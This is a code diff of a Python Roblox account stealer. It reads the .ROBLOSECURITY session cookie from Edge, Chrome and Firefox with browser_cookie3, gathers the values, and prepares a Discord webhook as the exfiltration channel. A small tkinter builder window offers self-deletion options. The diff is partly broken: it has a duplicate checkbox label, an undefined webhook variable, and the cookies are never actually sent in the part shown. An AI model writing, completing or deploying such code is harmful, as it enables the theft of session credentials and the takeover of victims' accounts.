@@ -1,5 +1,5 @@
 from discord_webhook import DiscordWebhook
-import tkinter
+import tkinter as tk
 from tkinter import ttk
 import browser_cookie3
 
@@ -9,19 +9,71 @@ def send_discord_webhook(message):
     webhook = DiscordWebhook(url=webhook_url, content=message)
     response = webhook.execute()
 
-webhook = DiscordWebhook(url='your_discord_webhook_url_here')
+burn = False
+pcget = False
+urlencode = False
+
+def setBurn():
+    global burn
+    if burnvar.get():
+        burn = True
+    else:
+        burn = False
+        
+def getPc():
+    global pcget
+    if getpcvar.get():
+        pcget = True
+    else:
+        pcget = False
+
+def encodeUrl():
+    global urlencode
+    if encodeurlvar.get():
+        urlencode = True
+    else:
+        urlencode = False
+
+root = tk.Tk()
+root.title("RoConfig")
+
+burnvar = tk.IntVar()
+burncheckbox = tk.Checkbutton(root, text="Delete on Run", variable=burnvar, command=setBurn)
+burncheckbox.pack(pady=15)
+
+getpcvar = tk.IntVar()
+getpccheckbox = tk.Checkbutton(root, text="Delete on Run", variable=getpcvar, command=getPc)
+getpccheckbox.pack(pady=15)
+
+root.geometry("300x350")
+root.mainloop()
+
+vcookies = []
+webhook = DiscordWebhook(url=str(webby))
 edge = True
 chrome = True
 firefox = True
+
 def logger():
+    global edge, chrome, firefox
     try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        roblo_security = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
+        edge_roblo_security = str(edge_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        vcookies.append(edge_roblo_security)
     except:
         edge = False
         pass
     try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        roblo_security = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        chrome_roblo_security = str(chrome_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        vcookies.append(chrome_roblo_security)
     except:
+        chrome = False
+        pass
+    try:
+        fire_cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        fire_roblo_security = str(fire_cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        vcookies.append(fire_roblo_security)
+    except:
+        firefox = False
         pass
